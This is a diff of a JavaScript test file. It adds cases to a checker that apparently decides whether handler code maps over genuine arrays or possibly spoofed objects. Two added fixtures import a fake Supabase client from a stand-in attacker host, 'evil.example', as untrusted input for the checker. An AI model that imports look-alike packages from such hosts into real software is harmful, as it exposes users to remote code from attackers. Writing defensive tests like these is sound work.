@@ -665,7 +665,7 @@ for (const [declarations, branch, expected] of [
   assert.equal(validationExitCode(validateActionContract(contractFor(trustedBindingFlow.map((entry) => entryFrom(entry)), trustedBindingFlow), trustedBindingFlow)), expected === "undetermined" ? 1 : 0, `${declarations} ${branch}`);
 }
 
-// Step 7I scenarios 38-42: nested labels, primitive short-circuit and imported namespaces.
+// Step 7I scenarios 38-45: nested labels, primitive short-circuit, imports and exhaustive returns.
 for (const [declarations, branch, expected] of [
   ['const wrappers={map:async cb=>cb()};let items=[1];', 'outer:for(let i=0;i<1;i++){switch(body.kind){case "bad":items=wrappers;break outer;default:items=[]}items=[]}return jsonResponse(await items.map(async()=>new Response("ok")));', 'undetermined'],
   ['const wrappers={map:async cb=>cb()};let items=[1];', 'outer:{inner:{items=wrappers;break inner;items=[]}items=[]}return jsonResponse(items.map(x=>x));', 'inline-real'],
@@ -676,6 +676,10 @@ for (const [declarations, branch, expected] of [
   ['const items=false||[];', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
   ['const items=""||[];', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
   ['const items=null??[];', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
+  ['const items=undefined??[];', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
+  ['const items=NaN||[];', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
+  ['const items=true&&[];', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
+  ['const items="rows"&&[];', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
   ['const P=Promise;const [items]=await P.all([[1]]);', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
   ['const wrappers={map:async cb=>cb()};const Promise={all:async()=>[wrappers]};const P=Promise;const [items]=await P.all([[1]]);', 'return jsonResponse(await items.map(async()=>new Response("ok")));', 'undetermined'],
   ['const A=Array;const items=A.from([1]);', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
@@ -685,12 +689,18 @@ for (const [declarations, branch, expected] of [
   ['import {createClient as makeClient} from "https://esm.sh/@supabase/supabase-js@2";const supabase=makeClient("url","key");const {data}=await supabase.from("rows").select();', 'return jsonResponse(data.map(x=>x));', 'inline-real'],
   ['import * as sb from "https://esm.sh/@supabase/supabase-js@2";const supabase=sb.createClient("url","key");const {data}=await supabase.from("rows").select();', 'return jsonResponse(data.map(x=>x));', 'inline-real'],
   ['const wrappers={map:async cb=>cb()};import createClient from "https://esm.sh/@supabase/supabase-js@2";const supabase=createClient();const {data}=await supabase.from("rows").select();', 'return jsonResponse(await data.map(async()=>new Response("ok")));', 'undetermined'],
+  ['const wrappers={map:async cb=>cb()};import {createClient as makeClient} from "https://evil.example/@supabase/supabase-js-fake";const supabase=makeClient();const {data}=await supabase.from("rows").select();', 'return jsonResponse(await data.map(async()=>new Response("ok")));', 'undetermined'],
+  ['const wrappers={map:async cb=>cb()};import * as sb from "https://evil.example/@supabase/supabase-js-fake";const supabase=sb.createClient();const {data}=await supabase.from("rows").select();', 'return jsonResponse(await data.map(async()=>new Response("ok")));', 'undetermined'],
   ['const wrappers={map:async cb=>cb()};function createClient(){return {from(){return {select(){return {data:wrappers}}}}}}const supabase=createClient();const {data}=await supabase.from("rows").select();', 'return jsonResponse(await data.map(async()=>new Response("ok")));', 'undetermined'],
   ['import {createClient as makeClient} from "https://esm.sh/@supabase/supabase-js@2";function getClient(){if(body.cached)return makeClient("u","k");return makeClient("u","k")}const supabase=getClient();const {data}=await supabase.from("rows").select();', 'return jsonResponse(data.map(x=>x));', 'inline-real'],
   ['const wrappers={map:async cb=>cb()};import {createClient as makeClient} from "https://esm.sh/@supabase/supabase-js@2";const fake={from(){return {select(){return {data:wrappers}}}}};function getClient(){if(body.fake)return fake;return makeClient("u","k")}const supabase=getClient();const {data}=await supabase.from("rows").select();', 'return jsonResponse(await data.map(async()=>new Response("ok")));', 'undetermined'],
   ['type Rows=unknown[];function getItems():Rows{const value=[1] as Rows;return value}const items=getItems();', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
   ['const wrappers={map:async cb=>cb()};type Rows=unknown[];function getItems():Rows{const value=wrappers;return value as unknown as Rows}const items=getItems();', 'return jsonResponse(await items.map(async()=>new Response("ok")));', 'undetermined'],
   ['type Rows=unknown[];function getItems():Rows{function hidden(){return body.value}const value=[1];return value}const items=getItems();', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
+  ['function getItems(){if(body.a)return [1];else return [2]}const items=getItems();', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
+  ['const wrappers={map:async cb=>cb()};function getItems(){if(body.a){return [1]}else{return [2]}return wrappers}const items=getItems();', 'return jsonResponse(items.map(x=>x));', 'inline-real'],
+  ['const wrappers={map:async cb=>cb()};function getItems(){if(body.a)return wrappers;return [1]}const items=getItems();', 'return jsonResponse(await items.map(async()=>new Response("ok")));', 'undetermined'],
+  ['const wrappers={map:async cb=>cb()};function getItems(){function hidden(){return wrappers}return hidden()}const items=getItems();', 'return jsonResponse(await items.map(async()=>new Response("ok")));', 'undetermined'],
   ['const broken=;const items=[1];', 'return jsonResponse(items.map(x=>x));', 'undetermined'],
   ['const state={items:[1]};state.self=state;const a=state.self;const b=a.self;', 'return jsonResponse(b.items.map(x=>x));', 'inline-real']
 ]) {
